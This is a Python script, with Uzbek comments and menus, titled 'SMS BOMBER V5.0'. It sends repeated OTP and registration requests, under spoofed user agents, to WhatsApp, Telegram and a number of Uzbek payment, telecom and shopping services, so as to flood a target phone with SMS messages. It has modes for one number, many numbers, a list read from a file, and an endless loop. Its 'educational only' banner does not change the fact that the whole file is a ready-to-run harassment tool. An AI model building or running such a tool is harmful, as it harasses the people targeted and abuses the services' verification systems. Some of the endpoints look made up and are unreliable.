#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 🇺🇿 SMS BOMBER V5.0 – TANLOV REJIMI BILAN
# ⚠️ FAQAT TAʼLIMIY MAQSADDA!

import sys
import os
import time
import re
import random
import json
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

try:
    import requests
except ImportError:
    print("⚠️ 'requests' kutubxonasi topilmadi. Oʻrnatilmoqda...")
    os.system(f"{sys.executable} -m pip install requests")
    import requests

# ----------------------- RANGLAR ----------------------------
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'
C = Colors()

# ----------------------- KONFIGURATSIYA --------------------
CONFIG = {
    'timeout': 10,
    'max_workers': 10,
    'user_agents': [
        'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    ]
}

# ----------------------- LOGGER ----------------------------
class Logger:
    def __init__(self):
        self.stats = {'total': 0, 'success': 0, 'failed': 0}
        self.lock = threading.Lock()
    def update(self, ok):
        with self.lock:
            self.stats['total'] += 1
            if ok:
                self.stats['success'] += 1
            else:
                self.stats['failed'] += 1
    def show(self):
        return f"Jami: {self.stats['total']}, OK: {self.stats['success']}, Fail: {self.stats['failed']}"
logger = Logger()

# ----------------------- SPAMMER SINFI ---------------------
class UzSpammer:
    def __init__(self, phone):
        self.phone = self._fmt(phone)
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': random.choice(CONFIG['user_agents'])})
        self.session.timeout = CONFIG['timeout']
        self.results = []

    def _fmt(self, p):
        p = re.sub(r'[^0-9+]', '', str(p))
        if p.startswith('+998') and len(p) == 13:
            return p
        if p.startswith('998') and len(p) == 12:
            return f'+{p}'
        if len(p) == 9 and p.isdigit():
            return f'+998{p}'
        if len(p) == 12 and p.isdigit():
            return f'+998{p[3:]}'
        return f'+998{p}'

    def _req(self, url, method='POST', data=None, json_data=None):
        try:
            if json_data:
                return self.session.post(url, json=json_data)
            elif data:
                return self.session.post(url, data=data)
            return self.session.get(url)
        except:
            return None

    # ==================== XIZMATLAR ====================
    
    # ---------- WHATSAPP ----------
    def whatsapp(self):
        try:
            r = self._req('https://web.whatsapp.com/register', 
                         data={'phone_number': self.phone[1:]})
            if r and r.status_code in (200, 302):
                logger.update(True)
                return f"{C.GREEN}✅ WhatsApp"
            logger.update(False)
            return f"{C.RED}❌ WhatsApp"
        except:
            logger.update(False)
            return f"{C.RED}❌ WhatsApp"

    def whatsapp_business(self):
        try:
            r = self._req('https://business.whatsapp.com/register',
                         data={'phone': self.phone})
            if r and r.status_code == 200:
                logger.update(True)
                return f"{C.GREEN}✅ WhatsApp Business"
            logger.update(False)
            return f"{C.RED}❌ WhatsApp Business"
        except:
            logger.update(False)
            return f"{C.RED}❌ WhatsApp Business"

    # ---------- TELEGRAM ----------
    def telegram(self):
        try:
            r = self._req('https://my.telegram.org/auth/send_password',
                         data={'phone': self.phone[1:]})
            if r and 'sent' in r.text.lower():
                logger.update(True)
                return f"{C.GREEN}✅ Telegram"
            logger.update(False)
            return f"{C.RED}❌ Telegram"
        except:
            logger.update(False)
            return f"{C.RED}❌ Telegram"

    def telegram_app(self):
        try:
            r = self._req('https://core.telegram.org/register',
                         data={'phone': self.phone})
            if r and r.status_code == 200:
                logger.update(True)
                return f"{C.GREEN}✅ Telegram App"
            logger.update(False)
            return f"{C.RED}❌ Telegram App"
        except:
            logger.update(False)
            return f"{C.RED}❌ Telegram App"

    # ---------- O'ZBEKISTON XIZMATLARI ----------
    def uzum(self):
        try:
            r = self._req('https://api.uzum.uz/api/v1/auth/send-sms-code',
                         json_data={'phone': self.phone, 'type': 'register'})
            if r and r.status_code == 200:
                logger.update(True)
                return f"{C.GREEN}✅ UZUM"
            logger.update(False)
            return f"{C.RED}❌ UZUM"
        except:
            logger.update(False)
            return f"{C.RED}❌ UZUM"

    def olx(self):
        try:
            r = self._req('https://www.olx.uz/api/v1/auth/request-otp/',
                         json_data={'phone': self.phone, 'lang': 'uz'})
            if r and 'otp' in r.text.lower():
                logger.update(True)
                return f"{C.GREEN}✅ OLX"
            logger.update(False)
            return f"{C.RED}❌ OLX"
        except:
            logger.update(False)
            return f"{C.RED}❌ OLX"

    def click(self):
        try:
            r = self._req('https://api.click.uz/api/v2/auth/send-code',
                         json_data={'phone': self.phone, 'service_id': '1'})
            if r and r.status_code in (200, 201):
                logger.update(True)
                return f"{C.GREEN}✅ CLICK"
            logger.update(False)
            return f"{C.RED}❌ CLICK"
        except:
            logger.update(False)
            return f"{C.RED}❌ CLICK"

    def payme(self):
        try:
            r = self._req('https://api.payme.uz/v1/auth/send-verification',
                         json_data={'phone_number': self.phone})
            if r and 'success' in r.text.lower():
                logger.update(True)
                return f"{C.GREEN}✅ PAYME"
            logger.update(False)
            return f"{C.RED}❌ PAYME"
        except:
            logger.update(False)
            return f"{C.RED}❌ PAYME"

    def apelsin(self):
        try:
            r = self._req('https://api.apelsin.uz/v1/oauth/sms',
                         json_data={'msisdn': self.phone, 'action': 'login'})
            if r and 'code' in r.text.lower():
                logger.update(True)
                return f"{C.GREEN}✅ APELSIN"
            logger.update(False)
            return f"{C.RED}❌ APELSIN"
        except:
            logger.update(False)
            return f"{C.RED}❌ APELSIN"

    def beeline(self):
        try:
            r = self._req('https://api.beeline.uz/v1/auth/send-sms',
                         json_data={'phone': self.phone})
            if r and r.status_code == 200:
                logger.update(True)
                return f"{C.GREEN}✅ BEELINE"
            logger.update(False)
            return f"{C.RED}❌ BEELINE"
        except:
            logger.update(False)
            return f"{C.RED}❌ BEELINE"

    def zoodmall(self):
        try:
            r = self._req('https://api.zoodmall.uz/v1/auth/send-sms',
                         json_data={'phone': self.phone})
            if r and 'otp' in r.text.lower():
                logger.update(True)
                return f"{C.GREEN}✅ ZOODMALL"
            logger.update(False)
            return f"{C.RED}❌ ZOODMALL"
        except:
            logger.update(False)
            return f"{C.RED}❌ ZOODMALL"

    def tashxis(self):
        try:
            r = self._req('https://api.tashxis.uz/v1/auth/send-code',
                         json_data={'phone': self.phone})
            if r and r.status_code == 200:
                logger.update(True)
                return f"{C.GREEN}✅ TASHXIS"
            logger.update(False)
            return f"{C.RED}❌ TASHXIS"
        except:
            logger.update(False)
            return f"{C.RED}❌ TASHXIS"

    def pochta(self):
        try:
            r = self._req('https://api.pochta.uz/v1/auth/send-otp',
                         json_data={'phone': self.phone})
            if r and r.status_code == 200:
                logger.update(True)
                return f"{C.GREEN}✅ POCHTA"
            logger.update(False)
            return f"{C.RED}❌ POCHTA"
        except:
            logger.update(False)
            return f"{C.RED}❌ POCHTA"

    def imei(self):
        try:
            r = self._req('https://api.imei.uz/v1/auth/send-code',
                         json_data={'phone': self.phone})
            if r and r.status_code == 200:
                logger.update(True)
                return f"{C.GREEN}✅ IMEI"
            logger.update(False)
            return f"{C.RED}❌ IMEI"
        except:
            logger.update(False)
            return f"{C.RED}❌ IMEI"

    def one_c(self):
        try:
            r = self._req('https://1c.uz/auth/send-sms',
                         json_data={'phone': self.phone})
            if r and r.status_code == 200:
                logger.update(True)
                return f"{C.GREEN}✅ 1C"
            logger.update(False)
            return f"{C.RED}❌ 1C"
        except:
            logger.update(False)
            return f"{C.RED}❌ 1C"

    # ==================== TANLOV REJIMLARI ====================
    
    def get_services_by_mode(self, mode):
        """Tanlangan rejimga mos xizmatlarni qaytaradi"""
        
        all_services = {
            'whatsapp': self.whatsapp,
            'whatsapp_business': self.whatsapp_business,
            'telegram': self.telegram,
            'telegram_app': self.telegram_app,
            'uzum': self.uzum,
            'olx': self.olx,
            'click': self.click,
            'payme': self.payme,
            'apelsin': self.apelsin,
            'beeline': self.beeline,
            'zoodmall': self.zoodmall,
            'tashxis': self.tashxis,
            'pochta': self.pochta,
            'imei': self.imei,
            'one_c': self.one_c
        }
        
        if mode == 'all':
            return list(all_services.values())
        elif mode == 'whatsapp':
            return [self.whatsapp, self.whatsapp_business]
        elif mode == 'telegram':
            return [self.telegram, self.telegram_app]
        elif mode == 'uzbek':
            return [self.uzum, self.olx, self.click, self.payme, 
                   self.apelsin, self.beeline, self.zoodmall,
                   self.tashxis, self.pochta, self.imei, self.one_c]
        elif mode == 'custom':
            # Foydalanuvchi tanlagan xizmatlar
            return self.custom_services()
        else:
            return list(all_services.values())
    
    def custom_services(self):
        """Foydalanuvchi o'zi tanlagan xizmatlar"""
        print(f"\n{C.YELLOW}📋 Qaysi xizmatlarni ishlatmoqchisiz?{C.END}")
        print(f"{C.CYAN}1. WhatsApp (2 ta){C.END}")
        print(f"{C.CYAN}2. Telegram (2 ta){C.END}")
        print(f"{C.CYAN}3. UZUM{C.END}")
        print(f"{C.CYAN}4. OLX{C.END}")
        print(f"{C.CYAN}5. CLICK{C.END}")
        print(f"{C.CYAN}6. PAYME{C.END}")
        print(f"{C.CYAN}7. APELSIN{C.END}")
        print(f"{C.CYAN}8. BEELINE{C.END}")
        print(f"{C.CYAN}9. ZOODMALL{C.END}")
        print(f"{C.CYAN}10. TASHXIS{C.END}")
        print(f"{C.CYAN}11. POCHTA{C.END}")
        print(f"{C.CYAN}12. IMEI{C.END}")
        print(f"{C.CYAN}13. 1C{C.END}")
        print(f"{C.YELLOW}0. Hammasi{C.END}")
        
        choices = input(f"{C.BLUE}📌 Raqamlarni vergul bilan yozing (mas: 1,2,3): {C.END}")
        choices = [c.strip() for c in choices.split(',') if c.strip().isdigit()]
        
        services = []
        for ch in choices:
            if ch == '0' or ch == 'all':
                return [self.whatsapp, self.whatsapp_business, self.telegram, 
                       self.telegram_app, self.uzum, self.olx, self.click, 
                       self.payme, self.apelsin, self.beeline, self.zoodmall,
                       self.tashxis, self.pochta, self.imei, self.one_c]
            elif ch == '1':
                services.extend([self.whatsapp, self.whatsapp_business])
            elif ch == '2':
                services.extend([self.telegram, self.telegram_app])
            elif ch == '3':
                services.append(self.uzum)
            elif ch == '4':
                services.append(self.olx)
            elif ch == '5':
                services.append(self.click)
            elif ch == '6':
                services.append(self.payme)
            elif ch == '7':
                services.append(self.apelsin)
            elif ch == '8':
                services.append(self.beeline)
            elif ch == '9':
                services.append(self.zoodmall)
            elif ch == '10':
                services.append(self.tashxis)
            elif ch == '11':
                services.append(self.pochta)
            elif ch == '12':
                services.append(self.imei)
            elif ch == '13':
                services.append(self.one_c)
        
        return services if services else list(all_services.values())

    def run(self, mode='all'):
        """Tanlangan rejimda xizmatlarni ishga tushirish"""
        services = self.get_services_by_mode(mode)
        results = []
        
        with ThreadPoolExecutor(max_workers=CONFIG['max_workers']) as ex:
            futures = [ex.submit(s) for s in services]
            for f in futures:
                results.append(f.result())
                time.sleep(0.2)
        
        return results

# ----------------------- INTERFEYS --------------------------
def clear():
    os.system('clear')

def banner():
    print(f"""
{C.BOLD}{C.CYAN}
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║      🇺🇿  SMS BOMBER V5.0 – TANLOV REJIMI  🇺🇿          ║
║                                                           ║
║      {C.RED}⚠️  FAQAT TAʼLIMIY MAQSADDA!  ⚠️              ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
{C.END}""")

def mode_menu():
    print(f"""
{C.YELLOW}┌─────────────────────────────────────────────────────────┐
│ {C.CYAN}1{C.YELLOW}. BARCHASIGA BIRDAN (WhatsApp + Telegram + Barchasi)│
│ {C.CYAN}2{C.YELLOW}. FAQAT WHATSAPP (Web + Business)                  │
│ {C.CYAN}3{C.YELLOW}. FAQAT TELEGRAM (Web + App)                      │
│ {C.CYAN}4{C.YELLOW}. FAQAT OʻZBEKISTON XIZMATLARI                    │
│ {C.CYAN}5{C.YELLOW}. OʻZIM TANLAYMAN (maxsus roʻyxat)                │
└─────────────────────────────────────────────────────────┘
{C.END}""")

def main_menu():
    print(f"""
{C.YELLOW}┌─────────────────────────────────────────────────────────┐
│ {C.CYAN}1{C.YELLOW}. Bitta raqamga spam                              │
│ {C.CYAN}2{C.YELLOW}. Koʻp raqamlarga spam                           │
│ {C.CYAN}3{C.YELLOW}. Fayldan spam                                  │
│ {C.CYAN}4{C.YELLOW}. Avtomatik rejim (cheksiz)                     │
│ {C.CYAN}5{C.YELLOW}. Statistika                                    │
│ {C.CYAN}0{C.YELLOW}. Chiqish                                       │
└─────────────────────────────────────────────────────────┘
{C.END}""")

def get_phone():
    while True:
        p = input(f"{C.BLUE}📱 Raqam (+998...): {C.END}").strip()
        p = re.sub(r'[^0-9+]', '', p)
        if p.startswith('+998') and len(p) == 13:
            return p
        if p.startswith('998') and len(p) == 12:
            return f'+{p}'
        if len(p) == 9 and p.isdigit():
            return f'+998{p}'
        print(f"{C.RED}❌ Notoʻgʻri format! Masalan: +998901234567{C.END}")

def get_mode():
    mode_menu()
    choice = input(f"{C.BLUE}📌 Spam rejimini tanlang [1-5]: {C.END}")
    
    modes = {
        '1': 'all',
        '2': 'whatsapp',
        '3': 'telegram',
        '4': 'uzbek',
        '5': 'custom'
    }
    
    if choice in modes:
        if choice == '5':
            print(f"\n{C.GREEN}🔧 O'zingiz tanlagan xizmatlar{C.END}")
        return modes[choice]
    else:
        print(f"{C.RED}❌ Notoʻgʻri! Default: barchasi{C.END}")
        return 'all'

def single_mode():
    clear(); banner()
    phone = get_phone()
    mode = get_mode()
    count = int(input(f"{C.BLUE}🔢 Necha marta: {C.END}"))
    delay = float(input(f"{C.BLUE}⏱️ Kechikish (sekund): {C.END}"))
    
    print(f"\n{C.GREEN}🚀 Boshlanyapti... (Rejim: {mode}){C.END}\n")
    
    for i in range(count):
        print(f"{C.YELLOW}━━━ {i+1}-chi urinish ━━━{C.END}")
        sp = UzSpammer(phone)
        for res in sp.run(mode):
            print(f"  {res}")
        print(f"{C.BLUE}📊 {logger.show()}{C.END}\n")
        time.sleep(delay)
    
    print(f"{C.GREEN}✅ Tugadi! {count} marta yuborildi.{C.END}")

def multi_mode():
    clear(); banner()
    phones = []
    n = int(input(f"{C.BLUE}👥 Nechta raqam: {C.END}"))
    for i in range(n):
        print(f"{C.YELLOW}Raqam {i+1}:{C.END}")
        phones.append(get_phone())
    
    mode = get_mode()
    count = int(input(f"{C.BLUE}🔢 Har biriga necha marta: {C.END}"))
    delay = float(input(f"{C.BLUE}⏱️ Kechikish: {C.END}"))
    
    print(f"\n{C.GREEN}🚀 Boshlanyapti...{C.END}\n")
    
    for i in range(count):
        print(f"{C.YELLOW}━━━ {i+1}-chi davr ━━━{C.END}")
        for phone in phones:
            print(f"{C.CYAN}📱 {phone}{C.END}")
            sp = UzSpammer(phone)
            for res in sp.run(mode):
                print(f"  {res}")
            print()
            time.sleep(delay/2)
        time.sleep(delay/2)
    
    print(f"{C.GREEN}✅ Tugadi!{C.END}")

def file_mode():
    clear(); banner()
    fname = input(f"{C.BLUE}📂 Fayl nomi: {C.END}")
    try:
        with open(fname, 'r') as f:
            phones = [line.strip() for line in f if line.strip()]
        if not phones:
            print(f"{C.RED}❌ Faylda raqamlar yoʻq!{C.END}")
            return
        
        print(f"{C.GREEN}✅ {len(phones)} ta raqam topildi{C.END}")
        mode = get_mode()
        count = int(input(f"{C.BLUE}🔢 Har biriga necha marta: {C.END}"))
        delay = float(input(f"{C.BLUE}⏱️ Kechikish: {C.END}"))
        
        print(f"\n{C.GREEN}🚀 Boshlanyapti...{C.END}\n")
        for i in range(count):
            print(f"{C.YELLOW}━━━ {i+1}-chi davr ━━━{C.END}")
            for phone in phones:
                print(f"{C.CYAN}📱 {phone}{C.END}")
                sp = UzSpammer(phone)
                for res in sp.run(mode):
                    print(f"  {res}")
                print()
                time.sleep(delay/2)
            time.sleep(delay/2)
        print(f"{C.GREEN}✅ Tugadi!{C.END}")
    except FileNotFoundError:
        print(f"{C.RED}❌ Fayl topilmadi: {fname}{C.END}")

def auto_mode():
    clear(); banner()
    phone = get_phone()
    mode = get_mode()
    delay = float(input(f"{C.BLUE}⏱️ Kechikish (sekund): {C.END}"))
    
    print(f"\n{C.RED}⚠️ Avtomatik rejim. Toʻxtatish CTRL+C{C.END}\n")
    count = 0
    try:
        while True:
            count += 1
            print(f"{C.YELLOW}━━━ {count}-chi urinish ━━━{C.END}")
            sp = UzSpammer(phone)
            for res in sp.run(mode):
                print(f"  {res}")
            print(f"{C.BLUE}⏱️ {datetime.now().strftime('%H:%M:%S')} | {logger.show()}{C.END}\n")
            time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n{C.GREEN}✅ Toʻxtatildi! Jami {count} marta.{C.END}")

def show_stats():
    clear(); banner()
    print(f"{C.CYAN}📊 STATISTIKA{C.END}")
    print(f"{C.YELLOW}{logger.show()}{C.END}")
    input(f"\n{C.BLUE}↩️  Enter bosish...{C.END}")

def main():
    while True:
        clear(); banner(); main_menu()
        choice = input(f"{C.BLUE}📌 Tanlang [0-5]: {C.END}")
        if choice == '1': single_mode()
        elif choice == '2': multi_mode()
        elif choice == '3': file_mode()
        elif choice == '4': auto_mode()
        elif choice == '5': show_stats()
        elif choice == '0':
            print(f"\n{C.GREEN}👋 Xayr!{C.END}")
            sys.exit(0)
        else:
            print(f"{C.RED}❌ Notoʻgʻri!{C.END}")
            time.sleep(1)
        input(f"\n{C.BLUE}↩️  Enter bosish...{C.END}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.GREEN}👋 Xayr!{C.END}")
        sys.exit(0)
    except Exception as e:
        print(f"{C.RED}❌ Xatolik: {e}{C.END}")
        sys.exit(1)
